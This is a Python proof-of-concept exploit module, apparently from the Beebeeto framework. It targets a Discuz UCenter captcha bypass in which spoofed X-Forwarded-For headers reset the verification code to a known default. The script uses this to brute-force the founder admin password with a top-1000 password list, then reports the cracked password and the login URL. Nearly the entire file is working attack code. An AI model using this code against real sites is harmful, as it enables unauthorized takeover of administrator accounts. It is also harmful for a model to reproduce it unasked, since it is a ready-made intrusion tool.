#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import random
import urllib
import requests
import urlparse

import SETTINGS

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0016',
            'name': 'Discuz UCenter X-Forwarded-For 验证码绕过导致可被爆破密码漏洞 Exploit',
            'author': 'user1018',
            'create_date': '2015-01-21',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['*'],
            'type': 'Other',
            'tag': ['Discuz UC_Center验证码绕过漏洞', 'Discuz暴力破解漏洞', 'UC_Center漏洞', 'php'],
            'desc': '''
                    登录uc_server的时候如果ip第一次出现那么seccode的默认值为cccc，
                    而ip地址是通过 X-Forwarded-For 获取的，所以可通过循环修改XFF绕过验证码限制。
                    ''',
            'references': ['http://wooyun.org/bugs/wooyun-2015-080211',
            ],
        },
    }

    @staticmethod
    def gethashs(url, args):
        url = '%s/uc_server/admin.php' % url
        r1 = re.compile('<input type="hidden" name="formhash" value="(\S+)" />')
        r2 = re.compile('<input type="hidden" name="seccodehidden" value="(\S+)" />')
        try:
            page_content = requests.get(url).text
            htmlhash = r1.findall(page_content)[0]
            htmlseccode = r2.findall(page_content)[0]
        except:
            htmlhash, htmlseccode = 'NONE', 'NONE'
        if args['options']['verbose']:
            print '[*] Get htmlhash: ' + str(htmlhash)
            print '[*] Get htmlseccode: ' + str(htmlseccode)
        return htmlhash, htmlseccode


    @classmethod
    def exploit(cls, args):
        url = args['options']['target']
        # Default: utils-top1000-password, Can be customized.
        f_pwd = open('%s/utils/payload/password_top1000' % SETTINGS.FRAMEWORK_DIR, 'r')
        for pwd in f_pwd.readlines():
            pwd = pwd.split()[0]
            if args['options']['verbose']:
                print '[*] Get htmlhash & htmlseccode...'
            htmlhash, htmlseccode = cls.gethashs(url, args)
            if htmlhash == 'NONE' or htmlseccode == 'NONE':
                return args
            # Start Scan Password
            if args['options']['verbose']:
                print '[*] TEST Password: %s\n' % pwd
            ip = str(random.randint(1,100))+"."+str(random.randint(100,244))+"."+str(random.randint(100,244))+"."+str(random.randint(100,244))
            headers_fake = {"Host": urlparse.urlparse(url).netloc,
                            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
                            "X-Forwarded-For": ip,
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Connection': 'keep-alive'}
            payload = 'sid=&formhash='+htmlhash+'&seccodehidden='+htmlseccode+'&iframe=0&isfounder=1&password='+pwd+'&seccode=cccc&submit=%E7%99%BB+%E5%BD%95'
            try:
                content = requests.post('%s/uc_server/admin.php?m=user&a=login'%url, data=payload, headers=headers_fake).content
            except:
                continue

            if r'''<div class="errormsg loginmsg"><p>验证码输入错误</p>''' in content:
                args['success'] = False
                args['poc_ret']['explain'] = 'Vulnerability does not exist.'
                return args

            if r'''src="admin.php?m=frame&a=main&sid''' in content:
                if r'''<body scroll="no">''' in content:
                    args['success'] = True
                    args['poc_ret']['login_url'] = '%s/uc_server/admin.php' % url
                    args['poc_ret']['password'] = pwd
                    return args
        args['success'] = True
        args['poc_ret']['prompt'] = 'The vulnerability is exsit, but blasting faild.'
        return args

    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())